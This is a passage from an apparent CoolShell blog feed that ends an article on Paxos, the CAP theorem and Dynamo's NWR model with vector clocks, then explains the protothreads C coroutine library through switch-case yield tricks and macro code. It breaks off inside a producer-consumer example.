<p>我们可以看以，这似乎就是一个“两段提交”的优化。其实，<strong>2PC/3PC都是分布式一致性算法的残次版本，Google Chubby的作者Mike Burrows说过这个世界上只有一种一致性算法，那就是Paxos，其它的算法都是残次品。</strong></p>
<p><strong></strong>我们还可以看到：对于同一个值的在不同结点的修改提案就算是在接收方被乱序收到也是没有问题的。</p>
<p>关于一些实例，你可以看一下Wikipedia中文中的“<a href="https://zh.wikipedia.org/zh/Paxos%E7%AE%97%E6%B3%95#.E5.AE.9E.E4.BE.8B" target="_blank">Paxos样例</a>”一节，我在这里就不再多说了。对于Paxos算法中的一些异常示例，大家可以自己推导一下。你会发现基本上来说只要保证有半数以上的结点存活，就没有什么问题。</p>
<p>多说一下，自从Lamport在1998年发表Paxos算法后，对Paxos的各种改进工作就从未停止，其中动作最大的莫过于2005年发表的<a href="http://research.microsoft.com/apps/pubs/default.aspx?id=64624" target="_blank">Fast Paxos</a>。无论何种改进，其重点依然是在消息延迟与性能、吞吐量之间作出各种权衡。为了容易地从概念上区分二者，称前者Classic Paxos，改进后的后者为Fast Paxos。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<div id="Msg_18730">下图来自：Google App Engine的co-founder Ryan Barrett在2009年的google i/o上的演讲《<a href="http://snarfed.org/transactions_across_datacenters_io.html" target="_blank">Transaction Across DataCenter</a>》（视频： <a title="阿里旺旺无法确定该链接的安全性" href="https://www.youtube.com/watch?v=srOgpXECblk" target="_blank">http://www.youtube.com/watch?v=srOgpXECblk</a>）</div>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">前面，我们说过，要想让数据有高可用性，就需要冗余数据写多份。写多份的问题会带来一致性的问题，而一致性的问题又会带来性能问题。从上图我们可以看到，我们基本上来说不可以让所有的项都绿起来，这就是著名的CAP理论：一致性，可用性，分区容忍性，你只可能要其中的两个。</p>
<h4>
<span class="ez-toc-section" id="NWR%E6%A8%A1%E5%9E%8B"></span>NWR模型<span class="ez-toc-section-end"></span>
</h4>
<p><strong>最后我还想提一下Amazon Dynamo的NWR模型。这个NWR模型把CAP的选择权交给了用户，让用户自己的选择你的CAP中的哪两个</strong>。</p>
<p>所谓NWR模型。N代表N个备份，W代表要写入至少W份才认为成功，R表示至少读取R个备份。<strong>配置的时候要求W+R &gt; N</strong>。 因为W+R &gt; N， 所以 R &gt; N-W 这个是什么意思呢？就是读取的份数一定要比总备份数减去确保写成功的倍数的差值要大。</p>
<p>也就是说，每次读取，都至少读取到一个最新的版本。从而不会读到一份旧数据。当我们需要高可写的环境的时候，我们可以配置W = 1 如果N=3 那么R = 3。 这个时候只要写任何节点成功就认为成功，但是读的时候必须从所有的节点都读出数据。如果我们要求读的高效率，我们可以配置 W=N R=1。这个时候任何一个节点读成功就认为成功，但是写的时候必须写所有三个节点成功才认为成功。</p>
<p>NWR模型的一些设置会造成脏数据的问题，因为这很明显不是像Paxos一样是一个强一致的东西，所以，可能每次的读写操作都不在同一个结点上，于是会出现一些结点上的数据并不是最新版本，但却进行了最新的操作。</p>
<p>所以，Amazon Dynamo引了数据版本的设计。也就是说，如果你读出来数据的版本是v1，当你计算完成后要回填数据后，却发现数据的版本号已经被人更新成了v2，那么服务器就会拒绝你。版本这个事就像“乐观锁”一样。</p>
<p>但是，对于分布式和NWR模型来说，版本也会有恶梦的时候——就是版本冲的问题，比如：我们设置了N=3 W=1，如果A结点上接受了一个值，版本由v1 -&gt; v2，但还没有来得及同步到结点B上（异步的，应该W=1，写一份就算成功），B结点上还是v1版本，此时，B结点接到写请求，按道理来说，他需要拒绝掉，但是他一方面并不知道别的结点已经被更新到v2，另一方面他也无法拒绝，因为W=1，所以写一分就成功了。于是，出现了严重的版本冲突。</p>
<p>Amazon的Dynamo把版本冲突这个问题巧妙地回避掉了——版本冲这个事交给用户自己来处理。</p>
<p>于是，Dynamo引入了Vector Clock（矢量钟？!）这个设计。这个设计让每个结点各自记录自己的版本信息，也就是说，对于同一个数据，需要记录两个事：1）谁更新的我，2）我的版本号是什么。</p>
<p>下面，我们来看一个操作序列：</p>
<p style="padding-left: 30px;">1）一个写请求，第一次被节点A处理了。节点A会增加一个版本信息(A，1)。我们把这个时候的数据记做D1(A，1)。 然后另外一个对同样key的请求还是被A处理了于是有D2(A，2)。这个时候，D2是可以覆盖D1的，不会有冲突产生。</p>
<p style="padding-left: 30px;">2）现在我们假设D2传播到了所有节点(B和C)，B和C收到的数据不是从客户产生的，而是别人复制给他们的，所以他们不产生新的版本信息，所以现在B和C所持有的数据还是D2(A，2)。于是A，B，C上的数据及其版本号都是一样的。</p>
<p style="padding-left: 30px;">3）如果我们有一个新的写请求到了B结点上，于是B结点生成数据D3(A,2; B,1)，意思是：数据D全局版本号为3，A升了两新，B升了一次。这不就是所谓的代码版本的log么？</p>
<p style="padding-left: 30px;">4）如果D3没有传播到C的时候又一个请求被C处理了，于是，以C结点上的数据是D4(A,2; C,1)。</p>
<p style="padding-left: 30px;">5）好，最精彩的事情来了：如果这个时候来了一个读请求，我们要记得，我们的W=1 那么R=N=3，所以R会从所有三个节点上读，此时，他会读到三个版本：</p>
<ul>
<ul>
<li>A结点：D2(A,2)</li>
<li>B结点：D3(A,2;  B,1);</li>
<li>C结点：D4(A,2;  C,1)</li>
</ul>
</ul>
<p style="padding-left: 30px;">6）这个时候可以判断出，D2已经是旧版本（已经包含在D3/D4中），可以舍弃。</p>
<p style="padding-left: 30px;">7）但是D3和D4是明显的版本冲突。于是，交给调用方自己去做版本冲突处理。就像源代码版本管理一样。</p>
<p>很明显，上述的Dynamo的配置用的是CAP里的A和P。</p>
<p>我非常推大家都去看看这篇论文：《<a href="http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/decandia07dynamo.pdf" target="_blank">Dynamo：Amazon’s Highly Available Key-Value Store</a>》，如果英文痛苦，你可以<a href="http://vdisk.weibo.com/s/AKRQZMLLc1ol%20%20" target="_blank">看看译文</a>（译者不详）。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-01-20T11:08:16+08:00</pubDate>
<guid>https://coolshell.cn/articles/10910.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一个“蝇量级” C 语言协程库 ]]></title>
<link>https://coolshell.cn/articles/10975.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 </strong><a href="https://weibo.com/fullofbull" target="_blank"><strong>@我的上铺叫路遥</strong></a><strong> 投稿）</strong></p>
<p>协程(coroutine)顾名思义就是“协作的例程”（co-operative routines）。跟具有操作系统概念的线程不一样，协程是在用户空间利用程序语言的语法语义就能实现逻辑上类似多任务的编程技巧。实际上协程的概念比线程还要早，按照 Knuth 的说法<strong>“子例程是协程的特例”</strong>，一个子例程就是一次子函数调用，那么实际上协程就是类函数一样的程序组件，你可以在一个线程里面轻松创建数十万个协程，就像数十万次函数调用一样。只不过子例程只有一个调用入口起始点，返回之后就结束了，而协程入口既可以是起始点，又可以从上一个返回点继续执行，也就是说协程之间可以通过 yield 方式转移执行权，<strong>对称（symmetric）、平级</strong>地调用对方，而不是像例程那样上下级调用关系。当然 Knuth 的“特例”指的是协程也可以模拟例程那样实现上下级调用关系，这就叫<strong>非对称协程</strong>（asymmetric coroutines）。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%9F%BA%E4%BA%8E%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9E%8B" title="基于事件驱动模型">基于事件驱动模型</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E8%9D%87%E9%87%8F%E7%BA%A7%E7%9A%84%E5%8D%8F%E7%A8%8B%E5%BA%93" title="“蝇量级”的协程库">“蝇量级”的协程库</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#C_%E8%AF%AD%E8%A8%80%E7%9A%84yield_%E8%AF%AD%E4%B9%89" title="C 语言的“yield 语义”">C 语言的“yield 语义”</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Protothreads%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87" title="Protothreads的上下文">Protothreads的上下文</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Protothreads%E7%9A%84%E5%8E%9F%E8%AF%AD%E5%92%8C%E7%BB%84%E4%BB%B6" title="Protothreads的原语和组件">Protothreads的原语和组件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Protothreads%E5%AE%9E%E6%88%98" title="Protothreads实战">Protothreads实战</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%8D%8F%E7%A8%8B%E5%BA%93_DIY_%E6%94%BB%E7%95%A5" title="协程库 DIY 攻略">协程库 DIY 攻略</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%9F%BA%E4%BA%8E%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8%E6%A8%A1%E5%9E%8B"></span>基于事件驱动模型<span class="ez-toc-section-end"></span>
</h4>
<p>我们举一个例子来看看一种<strong>对称协程</strong>调用场景，大家最熟悉的“生产者-消费者”事件驱动模型，一个协程负责生产产品并将它们加入队列，另一个负责从队列中取出产品并使用它。为了提高效率，你想一次增加或删除多个产品。伪代码可以是这样的：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># producer coroutine
loop
while queue is not full
  create some new items
  add the items to queue
yield to consumer

# consumer coroutine
loop
while queue is not empty
  remove some items from queue
  use the items
yield to producer</pre>
<p><span id="more-10975"></span></p>
<p>大多数教材上拿这种模型作为多线程的例子，实际上多线程在此的应用还是显得有点“重量级”，由于缺乏 yield 语义，线程之间不得不使用同步机制来避免产生全局资源的竟态，这就不可避免产生了休眠、调度、切换上下文一类的系统开销，而且线程调度还会产生时序上的不确定性。而对于协程来说，“挂起”的概念只不过是转让代码执行权并调用另外的协程，待到转让的协程告一段落后重新得到调用并从挂起点“唤醒”，这种协程间的调用是逻辑上可控的，时序上确定的，可谓一切尽在掌握中。</p>
<p>当今一些具备协程语义的语言，比较重量级的如C#、erlang、golang，以及轻量级的python、lua、javascript、ruby，还有函数式的scala、scheme等。相比之下，作为原生态语言的 C 反而处于尴尬的地位，原因在于 C 依赖于一种叫做<strong>栈帧</strong>的例程调用，例程内部的状态量和返回值都保留在堆栈上，这意味着生产者和消费者相互之间无法实现平级调用，当然你可以改写成把生产者作为主例程然后将产品作为传递参数调用消费者例程，这样的代码写起来费力不讨好而且看起来会很难受，特别当协程数目达到十万数量级，这种写法就过于僵化了。</p>
<p>这就引出了协程的概念，<strong>如果将每个协程的上下文（比如程序计数器）保存在其它地方而不是堆栈上，协程之间相互调用时，被调用的协程只要从堆栈以外的地方恢复上次出让点之前的上下文即可，这有点类似于 CPU 的上下文切换，</strong>遗憾的是似乎只有更底层的汇编语言才能做到这一点。</p>
<p>难道 C 语言只能用多线程吗？幸运的是，C 标准库给我们提供了两种协程调度原语：一种是<a title="http://zh.wikipedia.org/wiki/Setjmp.h" href="https://zh.wikipedia.org/wiki/Setjmp.h" target="_blank"> setjmp/longjmp</a>，另一种是<a title="http://pubs.opengroup.org/onlinepubs/7990989799/xsh/ucontext.h.html" href="https://pubs.opengroup.org/onlinepubs/7990989799/xsh/ucontext.h.html" target="_blank"> ucontext 组件</a>，它们内部（当然是用汇编语言）实现了协程的上下文切换，相较之下前者在应用上会产生相当的不确定性（比如不好封装，具体说明参考联机文档），所以后者应用更广泛一些，网上绝大多数 C 协程库也是基于 ucontext 组件实现的。</p>
<h4>
<span class="ez-toc-section" id="%E8%9D%87%E9%87%8F%E7%BA%A7%E7%9A%84%E5%8D%8F%E7%A8%8B%E5%BA%93"></span>“蝇量级”的协程库<span class="ez-toc-section-end"></span>
</h4>
<p>在此，我来介绍一种“蝇量级”的开源 C 协程库 <a title="http://dunkels.com/adam/pt/" href="http://dunkels.com/adam/pt/" target="_blank">protothreads</a>。这是一个全部用 ANSI C 写成的库，之所以称为“蝇量级”的，就是说，实现已经不能再精简了，几乎就是原语级别。事实上 protothreads 整个库不需要链接加载，因为所有源码都是头文件，类似于 STL 这样不依赖任何第三方库，在任何平台上可移植；总共也就 5 个头文件，有效代码量不足 100 行；API 都是宏定义的，所以不存在调用开销；最后，每个协程的空间开销是 2 个字节（是的，你没有看错，就是一个 short 单位的“栈”！）当然这种精简是要以使用上的局限为代价的，接下来的分析会说明这一点。</p>
<p>先来看看 protothreads 作者，<a title="http://dunkels.com/adam/" href="http://dunkels.com/adam/" target="_blank">Adam Dunkels</a>，一位来自瑞典皇家理工学院的计算机天才帅哥。话说这哥们挺有意思的，写了好多轻量级的作品，都是 BSD 许可证。顺便说一句，轻量级开源软件全世界多如牛毛，可像这位哥们写得如此出名的并不多。比如嵌入式网络操作系统 <a title="http://www.contiki-os.org/" href="http://www.contiki-os.org/" target="_blank">Contiki</a>，国人耳熟能详的 TCP/IP 协议栈 <a title="http://en.wikipedia.org/wiki/UIP_(micro_IP)" href="https://en.wikipedia.org/wiki/UIP_(micro_IP)" target="_blank">uIP</a> 和 <a title="http://savannah.nongnu.org/projects/lwip/" href="https://savannah.nongnu.org/projects/lwip/" target="_blank">lwIP</a> 也是出自其手。上述这些软件都是经过数十年企业级应用的考验，质量之高可想而知。</p>
<p>很多人会好奇如此“蝇量级”的代码究竟是怎么实现的呢？在分析 protothreads 源码之前，我先来给大家补一补 C 语言的基础课;-^)简而言之，这利用了 C 语言特性上的一个“奇技淫巧”，而且这种技巧恐怕连许多具备十年以上经验的 C 程序员老手都不见得知晓。当然这里先要声明我不是推荐大家都这么用，实际上这是以破坏语言的代码规范为代价，在一些严肃的项目工程中需要谨慎对待，除非你想被炒鱿鱼。</p>
<h4>
<span class="ez-toc-section" id="C_%E8%AF%AD%E8%A8%80%E7%9A%84yield_%E8%AF%AD%E4%B9%89"></span>C 语言的“yield 语义”<span class="ez-toc-section-end"></span>
</h4>
<p>下面的教程来自于一位 ARM 工程师、天才黑客 <a title="http://www.chiark.greenend.org.uk/~sgtatham/" href="http://www.chiark.greenend.org.uk/~sgtatham/" target="_blank">Simon Tatham</a>（开源 Telnet/SSH 客户端 <a title="http://www.chiark.greenend.org.uk/~sgtatham/putty/" href="http://www.chiark.greenend.org.uk/~sgtatham/putty/" target="_blank">PuTTY</a> 和汇编器 <a title="http://www.nasm.us/" href="http://www.nasm.us/" target="_blank">NASM</a> 的作者，吐槽一句，PuTTY的源码号称是所有正式项目里最难 hack 的 C，你应该猜到作者是什么语言出身）的博文：<a title="http://www.chiark.greenend.org.uk/~sgtatham/coroutines.html" href="http://www.chiark.greenend.org.uk/~sgtatham/coroutines.html" target="_blank">Coroutines in C</a>。中文译文在<a title="http://www.oschina.net/translate/coroutines-in-c" href="https://www.oschina.net/translate/coroutines-in-c" target="_blank">这里</a>。</p>
<p>我们知道 python 的 yield 语义功能类似于一种迭代生成器，函数会保留上次的调用状态，并在下次调用时会从上个返回点继续执行。用 C 语言来写就像这样：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int function(void) {
  int i;
  for (i = 0; i &lt; 10; i++)
    return i;   /* won't work, but wouldn't it be nice */
}</pre>
<p>连续对它调用 10 次，它能分别返回 0 到 9。该怎样实现呢？可以利用 goto 语句，如果我们在函数中加入一个状态变量，就可以这样实现：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int function(void) {
  static int i, state = 0;
  switch (state) {
    case 0: goto LABEL0;
    case 1: goto LABEL1;
  }
  LABEL0: /* start of function */
  for (i = 0; i &lt; 10; i++) {
    state = 1; /* so we will come back to LABEL1 */
    return i;
    LABEL1:; /* resume control straight after the return */
  }
}</pre>
<p>这个方法是可行的。我们在所有需要 yield 的位置都加上标签：起始位置加一个，还有所有 return 语句之后都加一个。每个标签用数字编号，我们在状态变量中保存这个编号，这样就能在我们下次调用时告诉我们应该跳到哪个标签上。每次返回前，更新状态变量，指向到正确的标签；不论调用多少次，针对状态变量的 switch 语句都能找到我们要跳转到的位置。</p>
<p>但这还是难看得很。最糟糕的部分是所有的标签都需要手工维护，还必须保证函数中的标签和开头 switch 语句中的一致。每次新增一个 return 语句，就必须想一个新的标签名并将其加到 switch 语句中；每次删除 return 语句时，同样也必须删除对应的标签。这使得维护代码的工作量增加了一倍。</p>
<p>仔细想想，其实我们可以不用 switch 语句来决定要跳转到哪里去执行，而是<strong>直接利用 switch 语句本身来实现跳转</strong>：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int function(void) {
  static int i, state = 0;
  switch (state) {
    case 0: /* start of function */
    for (i = 0; i &lt; 10; i++) {
      state = 1; /* so we will come back to "case 1" */
      return i;
      case 1:; /* resume control straight after the return */
    }
  }
}</pre>
<p>酷！没想到 switch-case 语句可以这样用，其实说白了 C 语言就是脱胎于汇编语言的，switch-case 跟 if-else 一样，无非就是汇编的条件跳转指令的另类实现而已（这也间接解释了为何汇编程序员经常揶揄 C 语言是“大便一样的代码”）。我们还可以用 __LINE__ 宏使其更加一般化：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int function(void) {
  static int i, state = 0;
  switch (state) {
    case 0: /* start of function */
    for (i = 0; i &lt; 10; i++) {
      state = __LINE__ + 2; /* so we will come back to "case __LINE__" */
      return i;
      case __LINE__:; /* resume control straight after the return */
    }
  }
}</pre>
<p>这样一来我们可以用宏提炼出一种范式，封装成组件：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define Begin() static int state=0; switch(state) { case 0:
#define Yield(x) do { state=__LINE__; return x; case __LINE__:; } while (0)
#define End() }
int function(void) {
  static int i;
  Begin();
  for (i = 0; i &lt; 10; i++)
    Yield(i);
  End();
}</pre>
<p>怎么样，看起来像不像发明了一种全新的语言？<strong>实际上我们利用了 switch-case 的分支跳转特性，以及预编译的 __LINE__ 宏，实现了一种隐式状态机，最终实现了“yield 语义”。</strong></p>
<p>还有一个问题，当你欢天喜地地将这种鲜为人知的技巧运用到你的项目中，并成功地拿去向你的上司邀功问赏的时候，你的上司会怎样看待你的代码呢？你的宏定义中大括号没有匹配完整，在代码块中包含了未用到的 case，Begin 和 Yield 宏里面不完整的七拼八凑……你简直就是公司里不遵守编码规范的反面榜样！</p>
<p>别着急，在原文中 Simon Tatham 大牛帮你找到一个坚定的反驳理由，我觉得对程序员来说简直是金玉良言。</p>
<p>将编程规范用在这里是不对的。文章里给出的示例代码不是很长，也不很复杂，即便以状态机的方式改写还是能够看懂的。但是随着代码越来越长，改写的难度将越来越大，改写对直观性造成的损失也变得相当相当大。</p>
<p>想一想，一个函数如果包含这样的小代码块：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">case STATE1:
/* perform some activity */
if (condition) state = STATE2; else state = STATE3;</pre>
<p>对于看代码的人说，这和包含下面小代码块的函数没有多大区别：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">LABEL1:
/* perform some activity */
if (condition) goto LABEL2; else goto LABEL3;</pre>
<p>是的，这两个函数的结构在视觉上是一样的，而对于函数中实现的算法，两个函数都一样不利于查看。因为你使用协程的宏而炒你鱿鱼的人，一样会因为你写的函数是由小块的代码和 goto 语句组成而吼着炒了你。只是这次他们没有冤枉你，因为像那样设计的函数会严重扰乱算法的结构。</p>
<p><strong>编程规范的目标就是为了代码清晰。</strong>如果将一些重要的东西，像 switch、return 以及 case 语句，隐藏到起“障眼”作用的宏中，从编程规范的角度讲，可以说你扰乱了程序的语法结构，并且违背了代码清晰这一要求。但是我们这样做是为了突出程序的算法结构，而算法结构恰恰是看代码的人更想了解的。</p>
<p><span style="color: #ff0000;"><strong>任何编程规范，坚持牺牲算法清晰度来换取语法清晰度的，都应该重写。</strong></span>如果你的上司因为使用了这一技巧而解雇你，那么在保安把你往外拖的时候要不断告诉他这一点。</p>
<p>原文作者最后给出了一个 MIT 许可证的 <a title="http://www.chiark.greenend.org.uk/~sgtatham/coroutine.h" href="http://www.chiark.greenend.org.uk/~sgtatham/coroutine.h" target="_blank">coroutine.h</a> 头文件。值得一提的是，正如文中所说，这种协程实现方法有个使用上的局限，就是<strong>协程调度状态的保存依赖于 static 变量，而不是堆栈上的局部变量</strong>，实际上也无法用局部变量（堆栈）来保存状态，这就使得代码不具备可重入性和多线程应用。后来作者补充了一种技巧，就是将局部变量包装成函数参数传入的一个虚构的上下文结构体指针，然后用动态分配的堆来“模拟”堆栈，解决了线程可重入问题。但这样一来反而有损代码清晰，比如所有局部变量都要写成对象成员的引用方式，特别是局部变量很多的时候很麻烦，再比如宏定义 malloc/free 的玩法过于托大，不易控制，搞不好还增加了被炒鱿鱼的风险（只不过这次是你活该）。</p>
<p>我个人认为，既然协程本身是一种单线程的方案，那么我们应该假定应用环境是单线程的，不存在代码重入问题，所以我们可以大胆地使用 static 变量，维持代码的简洁和可读性。事实上<strong>我们也不应该在多线程环境下考虑使用这么简陋的协程</strong>，非要用的话，前面提到 glibc 的 ucontext 组件也是一种可行的替代方案，它提供了一种协程私有堆栈的上下文，当然这种用法在跨线程上也并非没有限制，请仔细阅读联机文档。</p>
<h4>
<span class="ez-toc-section" id="Protothreads%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87"></span>Protothreads的上下文<span class="ez-toc-section-end"></span>
</h4>
<p>感谢 Simon Tatham 的淳淳教诲，接下来我们可以 hack 一下源码了。先来看看实现 protothreads 的数据结构， 实际上它就是协程的<strong>上下文结构体</strong>，用以保存状态变量，相信你很快就明白为何它的“堆栈”只有 2 个字节：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct pt {
  lc_t lc;
}</pre>
<p>里面只有一个 short 类型的变量，实际上它是用来保存上一次出让点的程序计数器。这也映证了协程比线程的灵活之处，就是协程可以是 stackless 的，如果需要实现的功能很单一，比如像生产者-消费者模型那样用来做事件通知，那么实际上协程需要保存的状态变量仅仅是一个程序计数器即可。像 python generator 也是 stackless 的，当然实现一个迭代生成器可能还需要保留上一个迭代值，前面 C 的例子是用 static 变量保存，你也可以设置成员变量添加到上下文结构体里面。如果你真的不确定用协程调度时需要保存多少状态变量，那还是用 ucontext 好了，它的上下文提供了堆栈和信号，但是由用户负责分配资源，详细使用方法见联机文档。。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">typedef struct ucontext {
  struct ucontext_t *uc_link;
  sigset_t uc_sigmask;
  stack_t uc_stack;
  ...
} ucontext_t;</pre>
<h4>
<span class="ez-toc-section" id="Protothreads%E7%9A%84%E5%8E%9F%E8%AF%AD%E5%92%8C%E7%BB%84%E4%BB%B6"></span>Protothreads的原语和组件<span class="ez-toc-section-end"></span>
</h4>
<p>有点扯远了，回到 protothreads，看看提供的协程“原语”。有两种实现方法，在 ANSI C 下，就是传统的 switch-case 语句：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define LC_INIT（s） s = 0;  // 源码中是有分号的，一个低级 bug，啊哈～
#define LC_RESUME(s) switch (s) { case 0:
#define LC_SET(s) s = __LINE__; case __LINE__:
#define LC_END(s) }
</pre>
<p>但这种“原语”有个难以察觉的缺陷：<strong>就是你无法在 LC_RESUME 和 LC_END （或者包含它们的组件）之间的代码中使用 switch-case语句，因为这会引起外围的 switch 跳转错误！</strong>为此，protothreads 又实现了基于 GNU C 的调度“原语”。在 GNU C 下还有一种语法糖叫做标签指针，就是在一个 label 前面加 &amp;&amp;（不是地址的地址，是 GNU 自定义的符号），可以用 void 指针类型保存，然后 goto 跳转：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">typedef void * lc_t；
#define LC_INIT(s) s = NULL
#define LC_RESUME(s) \
  do { \
    if (s != NULL) { \
      goto *s; \
    }
  } while (0)
#define LC_CONCAT2(s1, s2) s1##s2
#define LC_CONCAT(s1, s2) LC_CONCAT2(s1, s2)
#define LC_SET(s) \
  do { \
    LC_CONCAT(LC_LABEL, __LINE__): \
    （s） = &amp;&amp;LC_CONCAT(LC_LABEL, __LINE__); \
  } while (0)</pre>
<p>好了，有了前面的基础知识，理解这些“原语”就是小菜一叠，下面看看如何建立“组件”，同时也是 protothreads API，我们先定义四个退出码作为协程的<strong>调度状态机</strong>：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define PT_WAITING 0
#define PT_YIELDED 1
#define PT_EXITED  2
#define PT_ENDED   3</pre>
<p>下面这些 API 可直接在应用程序中调用：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">/* 初始化一个协程，也即初始化状态变量 */
#define PT_INIT(pt) LC_INIT((pt)-&gt;lc)

/* 声明一个函数，返回值为 char 即退出码，表示函数体内使用了 proto thread，（个人觉得有些多此一举） */
#define PT_THREAD(name_args) char name_args

/* 协程入口点， PT_YIELD_FLAG=0表示出让，=1表示不出让，放在 switch 语句前面，下次调用的时候可以跳转到上次出让点继续执行 */
#define PT_BEGIN(pt) { char PT_YIELD_FLAG = 1; LC_RESUME((pt)-&gt;lc)

/* 协程退出点，至此一个协程算是终止了，清空所有上下文和标志 */
#define PT_END(pt) LC_END((pt)-&gt;lc); PT_YIELD_FLAG = 0; \
                   PT_INIT(pt); return PT_ENDED; }

/* 协程出让点，如果此时协程状态变量 lc 已经变为 __LINE__ 跳转过来的，那么 PT_YIELD_FLAG = 1，表示从出让点继续执行。 */
#define PT_YIELD(pt)        \
  do {            \
    PT_YIELD_FLAG = 0;        \
    LC_SET((pt)-&gt;lc);       \
    if(PT_YIELD_FLAG == 0) {      \
      return PT_YIELDED;      \
    }           \
  } while(0)

/* 附加出让条件 */
#define PT_YIELD_UNTIL(pt, cond)    \
  do {            \
    PT_YIELD_FLAG = 0;        \
    LC_SET((pt)-&gt;lc);       \
    if((PT_YIELD_FLAG == 0) || !(cond)) { \
      return PT_YIELDED;      \
    }           \
  } while(0)

/* 协程阻塞点(blocking),本质上等同于 PT_YIELD_UNTIL，只不过退出码是 PT_WAITING，用来模拟信号量同步 */
#define PT_WAIT_UNTIL(pt, condition)          \
  do {            \
    LC_SET((pt)-&gt;lc);       \
    if(!(condition)) {        \
      return PT_WAITING;      \
    }           \
  } while(0)

/* 同 PT_WAIT_UNTIL 条件反转 */
#define PT_WAIT_WHILE(pt, cond)  PT_WAIT_UNTIL((pt), !(cond))

/* 协程调度，调用协程 f 并检查它的退出码，直到协程终止返回 0，否则返回 1。 */
#define PT_SCHEDULE(f) ((f) &lt; PT_EXITED)

/* 这用于非对称协程，调用者是主协程，pt 是和子协程 thread （可以是多个）关联的上下文句柄，主协程阻塞自己调度子协程，直到所有子协程终止 */
#define PT_WAIT_THREAD(pt, thread) PT_WAIT_WHILE((pt), PT_SCHEDULE(thread))

/* 用于协程嵌套调度，child 是子协程的上下文句柄 */
#define PT_SPAWN(pt, child, thread)   \
  do {            \
    PT_INIT((child));       \
    PT_WAIT_THREAD((pt), (thread));   \
  } while(0)</pre>
<p>暂时介绍这么多，用户还可以根据自己的需求随意扩展组件，比如实现信号量，你会发现脱离了操作系统环境下的信号量竟是如此简单：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct pt_sem {
  unsigned int count;
};

#define PT_SEM_INIT(s, c) (s)-&gt;count = c

#define PT_SEM_WAIT(pt, s)  \
  do {            \
    PT_WAIT_UNTIL(pt, (s)-&gt;count &gt; 0);    \
    --(s)-&gt;count;       \
  } while(0)

#define PT_SEM_SIGNAL(pt, s) ++(s)-&gt;count</pre>
<p>这些应该不需要我多说了吧，呵呵，让我们回到最初例举的生产者-消费者模型，看看protothreads表现怎样。</p>
<h4>
<span class="ez-toc-section" id="Protothreads%E5%AE%9E%E6%88%98"></span>Protothreads实战<span class="ez-toc-section-end"></span>
</h4>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include "pt-sem.h"

#define NUM_ITEMS 32
#define BUFSIZE 8

static struct pt_sem mutex, full, empty;

PT_THREAD(producer(struct pt *pt))
{
  static int produced;

  PT_BEGIN(pt);
  for (produced = 0; produced &lt; NUM_ITEMS; ++produced) {
    PT_SEM_WAIT(pt, &amp;full);
    PT_SEM_WAIT(pt, &amp;mutex);
    add_to_buffer(produce_item());
    PT_SEM_SIGNAL(pt, &amp;mutex);
    PT_SEM_SIGNAL(pt, &amp;empty);
  }
  PT_END(pt);
}

PT_THREAD(consumer(struct pt *pt))
{
  static int consumed;

  PT_BEGIN(pt);
  for (consumed = 0; consumed &lt; NUM_ITEMS; ++consumed) {
    PT_SEM_WAIT(pt, &amp;empty);
    PT_SEM_WAIT(pt, &amp;mutex);
    consume_item(get_from_buffer());
    PT_SEM_SIGNAL(pt, &amp;mutex);
    PT_SEM_SIGNAL(pt, &amp;full);
  }
  PT_END(pt);
}

PT_THREAD(driver_thread(struct pt *pt))
{
  static struct pt pt_producer, pt_consumer;

  PT_BEGIN(pt);
  PT_SEM_INIT(&amp;empty, 0);
